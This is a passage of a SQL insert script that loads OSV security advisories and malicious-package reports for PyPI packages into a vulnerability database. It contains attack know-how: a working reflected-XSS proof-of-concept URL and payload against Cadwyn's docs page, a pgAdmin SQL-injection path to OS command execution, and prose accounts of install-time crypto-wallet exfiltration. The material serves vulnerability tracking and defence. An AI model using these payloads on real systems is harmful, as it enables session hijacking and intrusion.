The keras.utils.get_file API in Keras, when used with the extract=True option for tar archives, is vulnerable to a path traversal attack. The utility uses Python''s tarfile.extractall function without the filter="data" feature. A remote attacker can craft a malicious tar archive containing special symlinks, which, when extracted, allows them to write arbitrary files to any location on the filesystem outside of the intended destination folder. This vulnerability is linked to the underlying Python tarfile weakness, identified as CVE-2025-4517. Note that upgrading Python to one of the versions that fix CVE-2025-4517 (e.g. Python 3.13.4) is not enough. One additionally needs to upgrade Keras to a version with the fix (Keras 3.12).', '["0.2.0", "0.3.0", "0.3.1", "0.3.2", "0.3.3", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7", "1.0.8", "1.1.0", "1.1.1", "1.1.2", "1.2.0", "1.2.1", "1.2.2", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.0.5", "2.0.6", "2.0.7", "2.0.8", "2.0.9", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.1.4", "2.1.5", "2.1.6", "2.10.0", "2.10.0rc0", "2.10.0rc1", "2.11.0", "2.11.0rc0", "2.11.0rc1", "2.11.0rc2", "2.11.0rc3", "2.12.0", "2.12.0rc0", "2.12.0rc1", "2.13.1", "2.13.1rc0", "2.13.1rc1", "2.14.0", "2.14.0rc0", "2.15.0", "2.15.0rc0", "2.15.0rc1", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.2.5", "2.3.0", "2.3.1", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.5.0rc0", "2.6.0", "2.6.0rc0", "2.6.0rc1", "2.6.0rc2", "2.6.0rc3", "2.7.0", "2.7.0rc0", "2.7.0rc2", "2.8.0", "2.8.0rc0", "2.8.0rc1", "2.9.0", "2.9.0rc0", "2.9.0rc1", "2.9.0rc2", "3.0.0", "3.0.1", "3.0.2", "3.0.3", "3.0.4", "3.0.5", "3.1.0", "3.1.1", "3.10.0", "3.11.0", "3.11.1", "3.11.2", "3.11.3", "3.2.0", "3.2.1", "3.3.0", "3.3.1", "3.3.2", "3.3.3", "3.4.0", "3.4.1", "3.5.0", "3.6.0", "3.7.0", "3.8.0", "3.9.0", "3.9.1", "3.9.2"]'::jsonb, '0.0', '2025-10-30 18:31:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3372', 'OSV', 'ninja-core-utils', 'pypi', 'Malicious code in ninja-core-utils (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (65af5eaa02abf860465d0ee9e11d7b10e3e1e36473aec951f8c1ea38ed8a8560)
During installation, obfuscated code exfiltrates cryptocurrency wallet data to a hardcoded location


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2026-05-ninja-core-utils


Reasons (based on the campaign):


 - The package overrides the install command in setup.py to execute malicious code during installation.


 - obfuscation


 - crypto-related


 - exfiltration-crypto


 - backdoor
', '["1.2.1"]'::jsonb, '0.0', '2026-05-07 21:25:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-6124', 'OSV', 'testpackages159', 'pypi', 'Malicious code in testpackages159 (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["0.0.1", "0.0.2"]'::jsonb, '0.0', '2024-06-25 13:43:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-47', 'OSV', 'django', 'pypi', '', 'In Django 3.2 before 3.2.25, 4.2 before 4.2.11, and 5.0 before 5.0.3, the django.utils.text.Truncator.words() method (with html=True) and the truncatewords_html template filter are subject to a potential regular expression denial-of-service attack via a crafted string. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232 and CVE-2023-43665.', '["3.2", "3.2.1", "3.2.10", "3.2.11", "3.2.12", "3.2.13", "3.2.14", "3.2.15", "3.2.16", "3.2.17", "3.2.18", "3.2.19", "3.2.2", "3.2.20", "3.2.21", "3.2.22", "3.2.23", "3.2.24", "3.2.3", "3.2.4", "3.2.5", "3.2.6", "3.2.7", "3.2.8", "3.2.9", "4.2", "4.2.1", "4.2.10", "4.2.2", "4.2.3", "4.2.4", "4.2.5", "4.2.6", "4.2.7", "4.2.8", "4.2.9", "5.0", "5.0.1", "5.0.2"]'::jsonb, '0.0', '2024-03-15 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2019-218', 'OSV', 'python-libnmap', 'pypi', '', 'libnmap < v0.6.3 is affected by: XML Injection. The impact is: Denial of service (DoS) by consuming resources. The component is: XML Parsing. The attack vector is: Specially crafted XML payload.', '["0.2.3", "0.2.4", "0.2.7", "0.2.8", "0.4.0", "0.4.6", "0.5.0", "0.5.1", "0.6", "0.6.1", "0.6.2"]'::jsonb, '0.0', '2019-07-15 03:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3704', 'OSV', 'graddio', 'pypi', 'Malicious code in graddio (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (cf6bbc8eaafef42ed4e5740b1ff94df7749de4241d44846467b438db586399ba)
During installation, package exfiltrates some basic info to a GitHub issue comment, and then attempt to set up a persistent infostealer focused on exfiltrating crypto wallets and browsers data. Likely continuation of 2026-05-py-requests


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2025-06-alembic-util


Reasons (based on the campaign):


 - infostealer


 - The package overrides the install command in setup.py to execute malicious code during installation.


 - crypto-related


 - Downloads and executes a remote malicious script.


 - exfiltration-browser-data


 - exfiltration-crypto


 - persistence


 - typosquatting
', '["0.226.51"]'::jsonb, '0.0', '2026-05-13 20:07:04+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hp84-p2gq-6fvr', 'OSV', 'pgadmin4', 'pypi', 'SQL injection vulnerability in pgAdmin 4 Maintenance Tool', 'SQL injection vulnerability in pgAdmin 4 Maintenance Tool.

Four user-supplied JSON fields (buffer_usage_limit, vacuum_parallel, vacuum_index_cleanup, reindex_tablespace) were concatenated directly into the rendered VACUUM/ANALYZE/REINDEX command and passed to psql --command. An authenticated user with the tools_maintenance permission could break out of the option syntax and execute arbitrary SQL on the connected PostgreSQL server. The injected SQL could in turn invoke COPY ... TO PROGRAM to escalate to operating-system command execution on the database host.

Fix introduces server-side allow-listing of all four fields and switches reindex_tablespace from manual quoting to the qtIdent filter.

This issue affects pgAdmin 4: before 9.15.', '["4.20", "4.22", "4.23", "4.24", "4.25", "4.26", "4.27", "4.28", "4.29", "4.30", "5.0", "5.1", "5.2", "5.3", "5.4", "5.5", "5.6", "5.7", "6.10", "6.11", "6.12", "6.13", "6.14", "6.15", "6.16", "6.17", "6.18", "6.19", "6.2", "6.20", "6.21", "6.3", "6.4", "6.5", "6.6", "6.7", "6.8", "6.9", "7.0", "7.1", "7.2", "7.3", "7.4", "7.5", "7.6", "7.7", "7.8", "8.0", "8.1", "8.10", "8.11", "8.12", "8.13", "8.14", "8.2", "8.3", "8.4", "8.5", "8.6", "8.7", "8.8", "8.9", "9.0", "9.1", "9.10", "9.11", "9.12", "9.13", "9.14", "9.2", "9.3", "9.4", "9.5", "9.6", "9.7", "9.8", "9.9"]'::jsonb, '0.0', '2026-05-11 18:31:44+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2026-131', 'OSV', 'sentry', 'pypi', '', 'Sentry 8.2.0 contains a remote code execution vulnerability that allows authenticated superusers to execute arbitrary commands by injecting malicious pickle-serialized objects through the audit log entry data parameter. Attackers can submit crafted POST requests to the admin audit log endpoint with base64-encoded compressed pickle payloads in the data field to achieve code execution with application privileges.', '["2.0.0", "2.0.0-Alpha1", "2.0.0-RC5", "2.0.0-RC6", "2.0.0-RC7", "2.0.1", "2.0.2", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.2.5", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.4.4", "2.4.5", "2.4.6", "2.4.7", "2.5.0", "2.5.1", "2.5.2", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.8.0", "2.8.1", "2.8.2", "2.9.0", "3.0.0", "3.0.1", "3.0.2", "3.0.3", "3.0.4", "3.1.0", "3.1.1", "3.1.2", "3.1.3", "3.1.4", "3.2.0", "3.3.0", "3.3.1", "3.3.2", "3.4.0", "3.4.1", "3.4.2", "3.5.0", "3.5.1", "3.5.2", "3.5.3", "3.5.4", "3.5.5", "3.5.6", "3.5.7", "3.5.8", "3.5.9", "3.6.0", "3.6.1", "3.6.2", "3.6.3", "3.6.4", "3.7.0", "3.7.1", "3.7.2", "3.7.3", "3.7.4", "3.8.0", "3.8.1", "3.8.2", "4.0.0", "4.0.1", "4.0.10", "4.0.11", "4.0.12", "4.0.13", "4.0.14", "4.0.15", "4.0.16", "4.0.17", "4.0.2", "4.0.3", "4.0.4", "4.0.5", "4.0.6", "4.0.7", "4.0.8", "4.0.9", "4.1.0", "4.1.1", "4.1.2", "4.1.3", "4.1.4", "4.1.5", "4.1.6", "4.1.7", "4.10.0", "4.2.0", "4.2.1", "4.2.2", "4.2.4", "4.2.5", "4.3.0", "4.3.1", "4.3.2", "4.3.3", "4.4.0", "4.4.1", "4.4.2", "4.4.3", "4.4.4", "4.4.5", "4.4.6", "4.5.0", "4.5.1", "4.5.2", "4.5.3", "4.5.4", "4.5.4.1", "4.5.4.2", "4.5.5", "4.5.6", "4.5.7", "4.6.0", "4.7.0", "4.7.1", "4.7.2", "4.7.3", "4.7.4", "4.7.5", "4.7.6", "4.7.7", "4.7.8", "4.7.9", "4.8.0", "4.8.1", "4.8.2", "4.8.3", "4.8.4", "4.8.5", "4.8.6", "4.9.0", "4.9.1", "4.9.2", "4.9.3", "4.9.4", "4.9.5", "4.9.6", "4.9.7", "4.9.7.1", "4.9.8", "5.0.0", "5.0.1", "5.0.10", "5.0.11", "5.0.11.1", "5.0.12", "5.0.13", "5.0.14", "5.0.15", "5.0.16", "5.0.16.1", "5.0.17", "5.0.17.1", "5.0.17.2", "5.0.18", "5.0.18.1", "5.0.18.2", "5.0.19", "5.0.2", "5.0.20", "5.0.20.1", "5.0.21", "5.0.3", "5.0.4", "5.0.5", "5.0.6", "5.0.7", "5.0.8", "5.0.8.1", "5.0.9", "5.1.0", "5.1.1", "5.1.1.1", "5.1.1.2", "5.1.2", "5.1.3", "5.1.4", "5.1.5", "5.2.0", "5.2.1", "5.2.2", "5.3.0", "5.3.1", "5.3.2", "5.3.3", "5.3.4", "5.4.0", "5.4.1", "5.4.2", "5.4.3", "5.4.4", "5.4.5", "5.4.6", "5.4.7", "5.5.0-DEV", "6.0.0", "6.0.1", "6.0.2", "6.0.3", "6.0.4", "6.0.5", "6.0.6", "6.1.0", "6.1.1", "6.1.2", "6.2.0", "6.2.1", "6.2.2", "6.2.3", "6.3.0", "6.3.1", "6.3.2", "6.3.3", "6.4.0", "6.4.1", "6.4.2", "6.4.2.1", "6.4.3", "6.4.4", "7.0.0", "7.0.1", "7.0.2", "7.1.0", "7.1.1", "7.1.2", "7.1.3", "7.1.4", "7.2.0", "7.3.0", "7.3.1", "7.3.2", "7.4.0", "7.4.1", "7.4.3", "7.5.0", "7.5.1", "7.5.2", "7.5.3", "7.5.4", "7.5.6", "7.6.0", "7.6.2", "7.7.0", "7.7.1", "7.7.4", "8.0.0", "8.0.0rc1", "8.0.0rc2", "8.0.1", "8.0.2", "8.0.3", "8.0.4", "8.0.5", "8.0.6", "8.1.1", "8.1.2", "8.1.3", "8.1.4", "8.1.5", "8.2.0"]'::jsonb, '0.0', '2026-05-10 13:16:29.693+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-53', 'OSV', 'salt', 'pypi', '', 'An issue was discovered in through SaltStack Salt before 3002.5. salt.modules.cmdmod can log credentials to the info or error log level.', '["0.10.0", "0.10.1", "0.10.2", "0.10.3", "0.10.4", "0.10.5", "0.11.0", "0.11.1", "0.12.0", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.13.3", "0.14.0", "0.14.1", "0.15.0", "0.15.1", "0.15.2", "0.15.3", "0.15.90", "0.16.0", "0.16.1", "0.16.2", "0.16.3", "0.16.4", "0.17.0", "0.17.0rc1", "0.17.1", "0.17.2", "0.17.3", "0.17.4", "0.17.5", "0.8.7", "0.8.9", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "0.9.4", "0.9.5", "0.9.6", "0.9.7", "0.9.8", "0.9.9", "0.9.9.1", "2014.1.0", "2014.1.0rc1", "2014.1.0rc2", "2014.1.0rc3", "2014.1.1", "2014.1.10", "2014.1.11", "2014.1.12", "2014.1.13", "2014.1.2", "2014.1.3", "2014.1.4", "2014.1.5", "2014.1.6", "2014.1.7", "2014.1.8", "2014.1.9", "2014.7.0", "2014.7.0rc1", "2014.7.0rc2", "2014.7.0rc3", "2014.7.0rc4", "2014.7.0rc5", "2014.7.0rc6", "2014.7.0rc7", "2014.7.1", "2014.7.2", "2014.7.3", "2014.7.4", "2014.7.5", "2014.7.6", "2014.7.7", "2015.2.0rc1", "2015.2.0rc2", "2015.5.0", "2015.5.1", "2015.5.10", "2015.5.11", "2015.5.2", "2015.5.3", "2015.5.4", "2015.5.5", "2015.5.6", "2015.5.7", "2015.5.8", "2015.5.9", "2015.8.0", "2015.8.0rc1", "2015.8.0rc2", "2015.8.0rc3", "2015.8.0rc4", "2015.8.0rc5", "2015.8.1", "2015.8.11", "2015.8.12", "2015.8.2", "2015.8.3", "2015.8.4", "2015.8.5", "2015.8.7", "2015.8.8", "2015.8.8.2", "2015.8.9", "2016.11.0", "2016.11.1", "2016.11.2", "2016.11.4", "2016.11.7", "2016.11.8", "2016.11.9", "2016.3.0", "2016.3.1", "2016.3.2", "2016.3.3", "2016.3.5", "2016.3.7", "2017.7.0", "2017.7.1", "2017.7.2", "2017.7.3", "2017.7.4", "2017.7.5", "2017.7.6", "2017.7.7", "2018.3.0", "2018.3.0rc1", "2018.3.1", "2018.3.2", "2018.3.3", "2018.3.4", "2018.3.5", "2019.2.0", "2019.2.1", "2019.2.2", "2019.2.3", "2019.2.4", "2019.2.6", "2019.2.7", "3000", "3000.1", "3000.2", "3000.3", "3000.4", "3000.5", "3001", "3001.1", "3001.2", "3001.3", "3002", "3002.1", "3002.2", "3002.3", "3002.4"]'::jsonb, '0.0', '2021-02-27 05:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-v899-28g4-qmh8', 'OSV', 'easy-xml', 'pypi', 'XML External Entity vulnerability in Easy-XML', 'The parseXML function in Easy-XML 0.5.0 was discovered to have a XML External Entity (XXE) vulnerability which allows for an attacker to expose sensitive data or perform a denial of service (DOS) via a crafted external entity entered into the XML content as input.', '["0.5.0"]'::jsonb, '0.0', '2021-11-01 19:19:54+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2gxp-6r36-m97r', 'OSV', 'cadwyn', 'pypi', 'Cadwyn vulnerable to XSS on the docs page', '### Summary
The `version` parameter of the `/docs` endpoint is vulnerable to a Reflected XSS (Cross-Site Scripting) attack.

### PoC
1. Setup a minimal app following the quickstart guide: https://docs.cadwyn.dev/quickstart/setup/
2. Click on the following PoC link: http://localhost:8000/docs?version=%27%2balert(document.domain)%2b%27

### Impact
Refer to this [security advisory](https://github.com/Visionatrix/Visionatrix/security/advisories/GHSA-w36r-9jvx-q48v) for an example of the impact of a similar vulnerability that shares the same root cause.

This XSS would notably allow an attacker to execute JavaScript code on a user''s session for any application based on `Cadwyn` via a one-click attack.

A CVSS for the average case may be: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L

### Details
The vulnerable code snippet can be found in the 2 functions `swagger_dashboard` and `redoc_dashboard`: https://github.com/zmievsa/cadwyn/blob/main/cadwyn/applications.py#L387-L413

The implementation uses the [get_swagger_ui_html](https://fastapi.tiangolo.com/reference/openapi/docs/?h=get_swagger_ui_html#fastapi.openapi.docs.get_swagger_ui_html) function from FastAPI. This function does not encode or sanitize its arguments before using them to generate the HTML for the swagger documentation page and is not intended to be used with user-controlled arguments.

```python
    async def swagger_dashboard(self, req: Request) -> Response:
        version = req.query_params.get("version")

        if version:
            root_path = self._extract_root_path(req)
            openapi_url = root_path + f"{self.openapi_url}?version={version}"
            oauth2_redirect_url = self.swagger_ui_oauth2_redirect_url
            if oauth2_redirect_url:
                oauth2_redirect_url = root_path + oauth2_redirect_url
            return get_swagger_ui_html(
                openapi_url=openapi_url,
                title=f"{self.title} - Swagger UI",
                oauth2_redirect_url=oauth2_redirect_url,
                init_oauth=self.swagger_ui_init_oauth,
                swagger_ui_parameters=self.swagger_ui_parameters,
            )
        return self._render_docs_dashboard(req, cast("str", self.docs_url))
```

In this case, the `openapi_url` variable contains the version which comes from a user supplied query string without encoding or sanitisation. The user controlled injection ends up inside of a string in a `<script>` tag context: https://github.com/fastapi/fastapi/blob/master/fastapi/openapi/docs.py#L132

```python
    f"""
    ...
    const ui = SwaggerUIBundle({{
        url: ''{openapi_url}'',
    """
```

By simply injecting a single quote we can escape from the string context and execute JavaScript like so `''+alert(document.domain)+''`

The resulting HTML sent back from the server contains the following injection:

```python
  const ui = SwaggerUIBundle({
        url: ''/openapi/flows.json?flows=''+alert(document.domain)+'''',
```', '["0.1.0", "0.2.0", "1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.1.0", "1.2.0", "1.3.0", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.0.5", "2.1.0", "2.1.0rc0", "2.1.0rc1", "2.2.0", "2.3.0", "2.3.0rc0", "2.3.1", "2.3.2", "2.3.3", "2.3.4", "2.3.5", "3.0.0", "3.0.1", "3.0.2", "3.1.0", "3.1.1", "3.1.2", "3.1.3", "3.1.4", "3.10.0", "3.10.1", "3.11.0", "3.11.1", "3.12.0", "3.12.1", "3.13.0", "3.14.0", "3.15.0", "3.15.1", "3.15.10", "3.15.2", "3.15.3", "3.15.3a1", "3.15.3a2", "3.15.4", "3.15.5", "3.15.6", "3.15.7", "3.15.8", "3.15.9", "3.2.0", "3.3.0", "3.3.1", "3.3.2", "3.3.3", "3.3.4", "3.4.0", "3.4.0.dev0", "3.4.1", "3.4.2", "3.4.3", "3.4.4", "3.4.5", "3.5.0", "3.6.0", "3.6.0.dev0", "3.6.1", "3.6.2", "3.6.3", "3.6.4", "3.6.5", "3.6.6", "3.7.0", "3.7.1", "3.8.0", "3.9.0", "3.9.1", "4.0.0", "4.1.0", "4.2.0", "4.2.1", "4.2.2", "4.2.3", "4.2.4", "4.3.0", "4.3.1", "4.4.0", "4.4.1", "4.4.2", "4.4.3", "4.4.5", "4.5.0", "4.6.0", "4.6.0a1", "5.0.0", "5.0.0a1", "5.1.0", "5.1.0a1", "5.1.1", "5.1.2", "5.1.3", "5.1.4", "5.2.0", "5.2.1", "5.2.2", "5.3.0", "5.3.1", "5.3.2", "5.3.3", "5.4.1", "5.4.2"]'::jsonb, '0.0', '2025-07-21 14:08:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6p2h-rjj7-2j63', 'OSV', 'barbican', 'pypi', 'openstack-barbican Denial of Service vulnerability', 'An authorization flaw was found in openstack-barbican, where anyone with an admin role could add secrets to a different project container. This flaw allows an attacker on the network to consume protected resources and cause a denial of service.', '["0", "10.0.0", "10.0.0.0rc1", "10.1.0", "11.0.0", "11.0.0.0rc1", "12.0.0", "12.0.0.0rc1", "12.0.0.0rc2", "12.0.1", "12.0.2", "13.0.0", "13.0.0.0rc1", "13.0.1", "13.0.2", "14.0.0.0rc1", "6.0.0.0b1", "8.0.0", "8.0.0.0rc1", "8.0.1", "9.0.0", "9.0.0.0rc1", "9.0.1"]'::jsonb, '0.0', '2022-09-02 00:01:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1224', 'OSV', 'spark-ml-utilities', 'pypi', 'Malicious code in spark-ml-utilities (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (3c1db0bd2243007553e09eff3018d49b00dbdf3a5183d364225d32f80f7b773f)
During installation, the package starts obfuscated code that downloads and runs remote executables in specific environments. In some packages in the campaign, the code only attempts to exfiltrate some basic information using DNS requests and then likely cover tracks by installing a similarly named package from private repository

Related campaigns: 2026-02-spark-audit-notify, 2026-03-geekennedy


---

Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.


Campaign: 2026-02-urllib-slim


Reasons (based on the campaign):


 - typosquatting


 - Downloads and executes a remote executable.


 - obfuscation


 - dependency-confusion
', '["1.0.0", "1.0.1"]'::jsonb, '0.0', '2026-03-03 18:13:56+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-rj98-crf4-g69w', 'OSV', 'pgadmin4', 'pypi', 'pgAdmin 4 vulnerable to Unsafe Deserialization and Remote Code Execution by an Authenticated user', 'pgAdmin prior to version 8.4 is affected by a path-traversal vulnerability while deserializing users’ sessions in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution.', '["4.20", "4.22", "4.23", "4.24", "4.25", "4.26", "4.27", "4.28", "4.29", "4.30", "5.0", "5.1", "5.2", "5.3", "5.4", "5.5", "5.6", "5.7", "6.10", "6.11", "6.12", "6.13", "6.14", "6.15", "6.16", "6.17", "6.18", "6.19", "6.2", "6.20", "6.21", "6.3", "6.4", "6.5", "6.6", "6.7", "6.8", "6.9", "7.0", "7.1", "7.2", "7.3", "7.4", "7.5", "7.6", "7.7", "7.8", "8.0", "8.1", "8.2", "8.3"]'::jsonb, '0.0', '2024-03-07 21:30:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c3xq-cj8f-7829', 'OSV', 'python-keystoneclient', 'pypi', 'Inadequate Encryption Strength in python-keystoneclient', 'python-keystoneclient version 0.2.3 to 0.2.5 has middleware memcache encryption bypass.', '["0.2.3", "0.2.4", "0.2.5"]'::jsonb, '0.0', '2021-10-12 16:31:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-886', 'OSV', 'exiv2', 'pypi', '', 'A buffer overflow vulnerability in the Databuf function in types.cpp of Exiv2 v0.27.1 leads to a denial of service (DOS).', '["0.1", "0.11.0", "0.11.1", "0.11.2", "0.11.3", "0.12.0", "0.12.1", "0.13.0", "0.13.1", "0.13.2", "0.14.0", "0.14.1", "0.15.0", "0.16.0", "0.16.1", "0.16.2", "0.16.2.post1", "0.16.3", "0.16.3.post1", "0.17.0", "0.17.1", "0.2", "0.3", "0.3.1", "0.17.2", "0.17.3", "0.17.4", "0.17.5"]'::jsonb, '0.0', '2021-07-13 22:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-1295', 'OSV', 'tabformerlite', 'pypi', 'Malicious code in tabformerlite (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (24a23931f60d9a2daf27a6df2eff2f3102cb239f6d058bed6646d208787f0c5b)
Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: GENERIC-standard-pypi-install-pentest


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The package overrides the install command in setup.py to execute malicious code during installation.

## Source: ossf-package-analysis (1bb9649abbc3c57b35f0f247886a0b50587f752f3cf5707db3a57e85502d40f2)
The OpenSSF Package Analysis project identified ''tabformerlite'' @ 99.0.0 (pypi) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["99.0.0"]'::jsonb, '0.0', '2026-03-09 17:26:01+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-5', 'OSV', 'cairosvg', 'pypi', '', 'CairoSVG is a Python (pypi) package. CairoSVG is an SVG converter based on Cairo. In CairoSVG before version 2.5.1, there is a regular expression denial of service (REDoS) vulnerability. When processing SVG files, the python package CairoSVG uses two regular expressions which are vulnerable to Regular Expression Denial of Service (REDoS). If an attacker provides a malicious SVG, it can make cairosvg get stuck processing the file for a very long time. This is fixed in version 2.5.1. See Referenced GitHub advisory for more information.', '["0.1", "0.1.1", "0.1.2", "0.2", "0.3", "0.3.1", "0.4", "0.4.1", "0.4.2", "0.4.3", "0.4.4", "0.5", "1.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7", "1.0.8", "1.0.9", "1.0.10", "1.0.11", "1.0.12", "1.0.13", "1.0.14", "1.0.15", "1.0.16", "1.0.17", "1.0.18", "1.0.19", "1.0.20", "1.0.21", "1.0.22", "2.0.0rc1", "2.0.0rc2", "2.0.0rc3", "2.0.0rc4", "2.0.0rc5", "2.0.0rc6", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.2.0", "2.2.1", "2.3.0", "2.3.1", "2.4.0", "2.4.1", "2.4.2", "2.5.0"]'::jsonb, '0.0', '2021-01-06 17:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2024-138', 'OSV', 'paddlepaddle', 'pypi', '', 'FPE in paddle.lerp in PaddlePaddle before 2.6.0. This flaw can cause a runtime crash and a denial of service.



', '["1.8.5", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.4.0rc0", "2.4.1", "2.4.2", "2.5.0", "2.5.0rc0", "2.5.0rc1", "2.5.1", "2.5.2"]'::jsonb, '0.0', '2024-01-03 09:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jh75-99hh-qvx9', 'OSV', 'django', 'pypi', 'Django memory consumption vulnerability', 'An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The floatformat template filter is subject to significant memory consumption when given a string representation of a number in scientific notation with a large exponent.', '["4.2", "4.2.1", "4.2.10", "4.2.11", "4.2.12", "4.2.13", "4.2.14", "4.2.2", "4.2.3", "4.2.4", "4.2.5", "4.2.6", "4.2.7", "4.2.8", "4.2.9"]'::jsonb, '0.0', '2024-08-07 15:30:42+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-1388', 'OSV', 'print-pip', 'pypi', 'Malicious code in print-pip (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (b212a33e119ddadecf30da008a6e74a0b1c954521ae1a596e715f201c0abf281)
The OpenSSF Package Analysis project identified ''print-pip'' @ 13.9.3 (pypi) as malicious.

It is considered malicious because:
- The package communicates with a domain associated with malicious activity.
', '["13.9.3"]'::jsonb, '0.0', '2023-05-20 14:05:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2010-1', 'OSV', 'mako', 'pypi', '', 'Mako before 0.3.4 relies on the cgi.escape function in the Python standard library for cross-site scripting (XSS) protection, which makes it easier for remote attackers to conduct XSS attacks via vectors involving single-quote characters and a JavaScript onLoad event handler for a BODY element.', '["0.1.0", "0.1.1", "0.1.10", "0.1.2", "0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.1.8", "0.1.9", "0.2.0", "0.2.1", "0.2.2", "0.2.3", "0.2.4", "0.2.5", "0.3.0", "0.3.1", "0.3.2", "0.3.3"]'::jsonb, '0.0', '2010-07-02 19:00:00+00') ON CONFLICT (id) DO NOTHING;
